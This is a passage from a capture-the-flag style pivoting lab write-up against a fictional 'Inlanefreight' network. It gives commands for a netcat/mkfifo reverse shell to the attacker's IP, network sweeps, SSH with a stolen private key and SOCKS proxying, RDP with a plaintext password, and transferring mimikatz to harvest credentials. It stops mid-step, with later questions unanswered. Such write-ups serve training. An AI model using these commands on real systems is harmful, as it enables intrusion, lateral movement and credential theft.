So we can do reverse shell to make our work easier.
On attack machine we get our IP and start netcat listener
```c
ip a | grep tun0
nc -nlvp 4444
```

On the webshell we run reverse shell with the ip of our attack machine
```c
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 4444 >/tmp/f
```

After that on our attack machine we will have our reverse shell.
We can upgrade it by running
```c
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After that we can make ICMP scan the network 172.16.0.0/16
```c
for i in {0..255}; do for j in {1..254}; do (ping -c 1 172.16.$i.$j | grep "bytes from" &) done; done; wait
```

I found this two host 
172.16.5.15, 172.16.5.35


20. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.

As we saw id_rsa file in the webadmin directory, we can open it and simply copy to our attack machine
In the attack machine change the permissions of the id_rsa and the ssh to the target
 ```c
chmod +x id_rsa
ssh -D 9050 webadmin@ip -i id_rsa
```

Here we get ssh login , for this we will make dynamic port forwarding to the 172.16.5.35
On the attack machine we modify proxychains file so last line will be 
```c
socks4 127.0.0.1 9050
```

Then I scan the ip using nmap with the proxychains
```c
proxychains nmap -v -Pn -sT 172.16.5.35
```

I found RDP port open , so I tried to connect to it
```c
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

Then on the system you can see the flag.txt file


21. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable? 

For this I will use tool mimikatz to get the password. I can transfer this tool from my attack machine to the target via python server
On attack machine in the folder where is the mimikatz.zip I run
```c
python3 -m http.server 8080
```

On the windows target I open chrome and insert the Ip of my attack machine and port
```c
http://IP:8080
```

And click to mimikatz.zip and extra
22. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation. 



23.  Submit the contents of C:\Flag.txt located on the Domain Controller. 